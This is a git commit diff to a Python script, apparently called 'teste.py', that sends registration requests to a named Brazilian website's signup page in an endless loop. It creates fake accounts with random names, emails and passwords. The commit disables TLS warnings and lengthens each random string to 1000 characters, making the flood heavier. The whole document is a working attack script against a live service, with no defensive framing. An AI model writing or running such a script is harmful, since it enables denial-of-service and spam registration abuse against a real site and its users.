a9296e820b36aa45c022a7c9bdb2683b28f2129a
TheHoltz <38303017+TheHoltz@users.noreply.github.com>
2018-12-09 13:59:39 -0200

    More fixes :p

--- teste.py
+++ teste.py
@@ -3,15 +3,16 @@ from random import choice
 from string import ascii_lowercase
 
 url = 'https://www.minemarket.com.br/register/'
+requests.packages.urllib3.disable_warnings()
 
 lis=list(ascii_lowercase)
 
 while(1):
-    ii = ''.join(choice(lis) for _ in range(25))
+    ii = ''.join(choice(lis) for _ in range(1000))
     r = requests.post(url, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=False, verify=False, data={
         'name': ii,
         'mail': ii+'@wh1t30wn4.c0m',
         'pass': ii,
         'register': ''
     })
-    print("Pacote enviado com sucesso: %s"%ii);
+    print("Pacote enviado com sucesso: %.15s"%ii);
